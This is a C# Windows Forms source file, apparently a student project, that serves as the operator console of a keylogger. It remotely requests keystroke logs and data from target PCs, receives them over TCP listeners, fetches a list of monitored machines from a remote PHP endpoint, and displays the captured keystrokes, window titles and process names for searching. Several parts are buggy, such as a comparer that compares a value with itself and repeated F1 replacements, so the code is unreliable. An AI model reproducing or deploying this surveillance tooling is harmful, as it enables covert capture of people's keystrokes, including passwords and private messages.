using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using IdpaTools;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;

namespace IdpaClient
{
    public partial class Form1 : Form
    {
        private const string LOG_PATH = @"C:\Temp\log_send.xml";
        private const string URI_GET_PCINFO = @"http://www.swordbreacker.ch/idpa/getdata.php";
        private Logger logger;
        private AutoCompleteStringCollection textSource = new AutoCompleteStringCollection();
        private AutoCompleteStringCollection dateSource = new AutoCompleteStringCollection();
        private AutoCompleteStringCollection wNameSource = new AutoCompleteStringCollection();
        private AutoCompleteStringCollection aNameSource = new AutoCompleteStringCollection();

        private PcInfromations pcInformations = new PcInfromations();

        public Form1()
        {
            InitializeComponent();
            logger = new Logger();
            GetKeyLoggerData();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            adressInfo.Start();
        }

        
        private void GetKeyLoggerData()
        {
            if (!File.Exists(LOG_PATH))
                return;

            logger = Serilizer.getDataFromFile(LOG_PATH, logger);

            foreach (ApplicationLog app in logger.applicationLog)
            {
                if (app.date == null || app.processName == null || app.windowName == null)
                    continue;

                string[] rowData = new string[4];

                string keyString = "";

                foreach (string key in app.keyList)
                {
                    keyString += key;
                }

                keyString = ReplaceKeyStrings(keyString);

                if (!aNameSource.Contains(app.processName))
                    aNameSource.Add(app.processName);
                if (!wNameSource.Contains(app.windowName))
                    wNameSource.Add(app.windowName);
                if (!dateSource.Contains(app.date.ToString()))
                    dateSource.Add(app.date.ToString());
                if (!textSource.Contains(keyString))
                    textSource.Add(keyString);

                rowData[0] = app.date.ToString();
                rowData[1] = app.processName;
                rowData[2] = app.windowName;
                rowData[3] = keyString;

                keyLoggerDataView.Rows.Add(rowData);
            }

            searchBox.AutoCompleteCustomSource = textSource;
        }

        private void getData_Click(object sender, EventArgs e)
        {
            print("Starting download...");
            adressInfo.Stop();
            if (ConnectionManager.SendCommand("127.0.0.1", "getdata"))
            {
                Task.Factory.StartNew(() => ConnectionManager.startAsyncTCPListener(2));
            }
            else print("Target not available");
            adressInfo.Start();
        }

        private void adressInfo_Tick(object sender, EventArgs e)
        {
            Task t = new Task(() => getPcInformations());
            t.Start(TaskScheduler.FromCurrentSynchronizationContext());
            pingServer();
        }

        private async void pingServer()
        {
            double ping = await ConnectionManager.Ping("127.0.0.1");
            pcPingData.Text = ping.ToString();
        }

        private void getPcInformations()
        {
            string xml = ConnectionManager.GetPcInformations(URI_GET_PCINFO);

            pcInformations = FileManager.DeserializePcInformations(xml, pcInformations);

            foreach (Pc pc in pcInformations.pc)
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Text = pc.name;
                lvi.Tag = pc.id;
                lvi.SubItems.Add(pc.ip);

                bool alredyExist = false;

                foreach (ListViewItem adressInfoList in adressinformation.Items)
                {
                    if (adressInfoList.Text == pc.name && adressInfoList.SubItems[1].Text == pc.ip)
                        alredyExist = true;
                }

                if (!alredyExist)
                {
                    int adressInfoId = -1;
                    foreach (ListViewItem adressInfoList in adressinformation.Items)
                    {
                        if (adressInfoList.Tag.ToString() == pc.id.ToString())
                        {
                            adressInfoId = adressInfoList.Index;
                        }
                    }

                    if (adressInfoId == -1)
                        adressinformation.Items.Add(lvi);
                    else
                    {
                        adressinformation.Items.RemoveAt(adressInfoId);
                        adressinformation.Items.Insert(adressInfoId, lvi);
                    }
                }
            }
        }

        private void search_Click(object sender, EventArgs e)
        {
            Search();
        }

        private void searchBox_OnKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.Return)
                Search();
        }

        private void Search()
        {
            print("Starting search of '" + searchBox.Text + "'...");

            if (searchBox.Text == "")
            {
                GetKeyLoggerData();
                return;
            }

            if(radioAName.Checked)
                SearchApplicationName();
            else if(radioDate.Checked)
                SearchDate();
            else if (radioWName.Checked)
                SearchWindowName();
            else
                SearchText();

            print("Search finished");
        }

        private void UpdateRows(int[] indexArray)
        {
            keyLoggerDataView.Rows.Clear();

            foreach(int i in indexArray)
            {
                ApplicationLog app = logger.applicationLog[i];

                if (app.date == null || app.processName == null || app.windowName == null)
                    continue;

                string[] rowData = new string[4];
                string keyString = "";
                
                foreach (string key in app.keyList)
                {
                    keyString += key;
                }

                keyString = ReplaceKeyStrings(keyString);

                rowData[0] = app.date.ToString();
                rowData[1] = app.processName;
                rowData[2] = app.windowName;
                rowData[3] = keyString;

                keyLoggerDataView.Rows.Add(rowData);
            }
        }

        private void SearchText()
        {
            List<int> appIndexes = new List<int>();

            for (int i = 0; i < logger.applicationLog.Count; i++ )
            {
                ApplicationLog app = logger.applicationLog[i];

                string keyString = "";

                foreach (string key in app.keyList)
                {
                    keyString += key;
                }

                keyString = ReplaceKeyStrings(keyString);

                if (keyString.ToLower().Contains(searchBox.Text.ToLower()))
                {
                    appIndexes.Add(i);
                }
            }
            UpdateRows(appIndexes.ToArray());
        }

        private void SearchApplicationName()
        {
            List<int> appIndexes = new List<int>();

            for (int i = 0; i < logger.applicationLog.Count; i++)
            {
                ApplicationLog app = logger.applicationLog[i];
                if (app.processName == null)
                    continue;

                if (app.processName.ToLower().Contains(searchBox.Text.ToLower()))
                {
                    appIndexes.Add(i);
                }
            }
            UpdateRows(appIndexes.ToArray());
        }

        private void SearchWindowName()
        {
            List<int> appIndexes = new List<int>();

            for (int i = 0; i < logger.applicationLog.Count; i++)
            {
                ApplicationLog app = logger.applicationLog[i];
                if (app.windowName == null)
                    continue;

                if (app.windowName.ToLower().Contains(searchBox.Text.ToLower()))
                {
                    appIndexes.Add(i);
                }
            }
            UpdateRows(appIndexes.ToArray());
        }

        private void SearchDate()
        {
            List<int> appIndexes = new List<int>();

            for (int i = 0; i < logger.applicationLog.Count; i++)
            {
                ApplicationLog app = logger.applicationLog[i];
                if (app.date == null)
                    continue;

                if (app.date.ToString().ToLower().Contains(searchBox.Text.ToLower()))
                {
                    appIndexes.Add(i);
                }
            }
            UpdateRows(appIndexes.ToArray());
        }

        private List<string> SortByHasCode(List<string> stringToSort)
        {
            stringToSort.Sort(CompareByHasCode);
            return stringToSort;
        }

        private int CompareByHasCode(string x, string y)
        {
            if (x.GetHashCode() > x.GetHashCode())
                return 1;
            if (x.GetHashCode() < x.GetHashCode())
                return -1;
            else return 0;
        }

        private string ReplaceKeyStrings(string text)
        {
            text = text.Replace("Space", " ");
            text = text.Replace("LButton", "[LM]");
            text = text.Replace("RButton", "[RM]");
            text = text.Replace("OemPeriod", "[,]");
            text = text.Replace("OemPoint", "[.]");
            text = text.Replace("OemMinus", "[-]");
            text = text.Replace("RShiftKey", "[rShift]");
            text = text.Replace("LShiftKey", "[lShift]");
            text = text.Replace("CapsLock", "[caps]");
            text = text.Replace("Tab", "[tab]");
            text = text.Replace("Oem2", "[§]");
            text = text.Replace("D0", "[0]");
            text = text.Replace("D1", "[1]");
            text = text.Replace("D2", "[2]");
            text = text.Replace("D3", "[3]");
            text = text.Replace("D4", "[4]");
            text = text.Replace("D5", "[5]");
            text = text.Replace("D6", "[6]");
            text = text.Replace("D7", "[7]");
            text = text.Replace("D8", "[8]");
            text = text.Replace("D9", "[9]");
            text = text.Replace("Oem4", "[']");
            text = text.Replace("Ome6", "[^]");
            text = text.Replace("Back", "[Back]");
            text = text.Replace("F1", "[F1]");
            text = text.Replace("F1", "[F2]");
            text = text.Replace("F1", "[F3]");
            text = text.Replace("F1", "[F4]");
            text = text.Replace("F1", "[F5]");
            text = text.Replace("F1", "[F6]");
            text = text.Replace("F1", "[F7]");
            text = text.Replace("F1", "[F8]");
            text = text.Replace("F1", "[F9]");
            text = text.Replace("F1", "[F10]");
            text = text.Replace("F1", "[F11]");
            text = text.Replace("F1", "[F12]");
            text = text.Replace("Enter", "[Enter]");
            text = text.Replace("Add", "[+]");
            text = text.Replace("Substract", "[-]");
            text = text.Replace("Multiple", "[*]");
            text = text.Replace("Divide", "[/]");
            text = text.Replace("NumLock", "[NLock]");
            text = text.Replace("Up", "[Up]");
            text = text.Replace("Down", "[Down]");
            text = text.Replace("Right", "[Down]");
            text = text.Replace("Left", "[Left]");
            text = text.Replace("OemSemiclon", "[ü]");
            text = text.Replace("OemQuotes", "[ö]");
            text = text.Replace("OemPipe", "[ä]");
            text = text.Replace("Oemtilde", "[¨]");
            text = text.Replace("Oem8", "[$]");
            text = text.Replace("LWin", "[LWin]");
            text = text.Replace("RWin", "[RWin]");
            text = text.Replace("LControlKey", "[LCtrl]");
            text = text.Replace("RControlKey", "[RCtrl]");
            text = text.Replace("LMenu", "[Alt]");
            text = text.Replace("RMenu", "[AltGr]");
            text = text.Replace("Decimal", "[.]");
            text = text.Replace("Delte", "[Del]");
            text = text.Replace("End", "[End]");
            text = text.Replace("PageDown", "[PageDown]");
            text = text.Replace("Prior", "[PageUp]");
            text = text.Replace("Home", "[Home]");
            text = text.Replace("NumPad0", "[0]");
            text = text.Replace("NumPad1", "[1]");
            text = text.Replace("NumPad2", "[2]");
            text = text.Replace("NumPad3", "[3]");
            text = text.Replace("NumPad4", "[4]");
            text = text.Replace("NumPad5", "[5]");
            text = text.Replace("NumPad6", "[6]");
            text = text.Replace("NumPad7", "[7]");
            text = text.Replace("NumPad8", "[8]");
            text = text.Replace("NumPad9", "[9]");
            
            return text;
        }

        private void radioText_CheckedChanged(object sender, EventArgs e)
        {
            searchBox.AutoCompleteCustomSource = textSource;
        }

        private void radioAName_CheckedChanged(object sender, EventArgs e)
        {
            searchBox.AutoCompleteCustomSource = aNameSource;
        }

        private void radioWName_CheckedChanged(object sender, EventArgs e)
        {
            searchBox.AutoCompleteCustomSource = wNameSource;
        }

        private void radioDate_CheckedChanged(object sender, EventArgs e)
        {
            searchBox.AutoCompleteCustomSource = dateSource;
        }

        public void print(string msg)
        {
            eventLog.AppendText(msg + "\r\n");
        }

        public static void storeData(byte[] data)
        {
            FileManager.SaveZipFile(data, @"C:\Temp\zipTest.zip");
        }

        public static void storeLogFile(byte[] data)
        {
            FileManager.SaveLogFile(data, @"C:\Temp\log_send.xml");
        }

        private async void refreshLogFile_Click(object sender, EventArgs e)
        {
            adressInfo.Stop();
            if(ConnectionManager.SendCommand("127.0.0.1", "getlogfile"))
            {
                await Task.Factory.StartNew(() => ConnectionManager.startAsyncTCPListener(1));
                GetKeyLoggerData();
            }
            adressInfo.Start();
        }


        //public static int BinSearch(ref int[] x, int searchValue)
        //{
        //    //Gibt den Index von SearchValue sortiert zurück
        //    //Gibt -1 zurück wenn searchValue nicht gefunden wird
        //    int left = 0;
        //    int right = x.Length;
        //    return binarySearch(ref x, searchValue, left, right);
        //}

        //private static int binarySearch(ref int[] x, int searchValue, int left, int right)
        //{
        //    //Wenn allle Elemente durchsucht wurden dann gibt -1 zurück
        //    if (right < left)
        //        return -1;

        //    //Ermittle die Mitte des Suchbereiches
        //    int mid = (left + right) >> 1;
        //    //Wenn der Suchwert grösser ist als dieser Eintrag machen eine Weitere suche mit dem Bereich: Mitte + 1 und Left
        //    if (searchValue > x[mid])
        //        return binarySearch(ref x, searchValue, mid + 1, right);
        //    //Wenn der Suchwert kleiner ist als dieser Eintrag mache eine Weitere suche mit dem Bereich: right und Mitte -1
        //    else if (searchValue < x[mid])
        //        return binarySearch(ref x, searchValue, left, mid - 1);
        //    //Wenn der Wert nicht kleiner oder grösser ist wurde der gesuchte Wert gefunden er wird ausgegeben
        //    else
        //        return mid;
        //}
    }
}

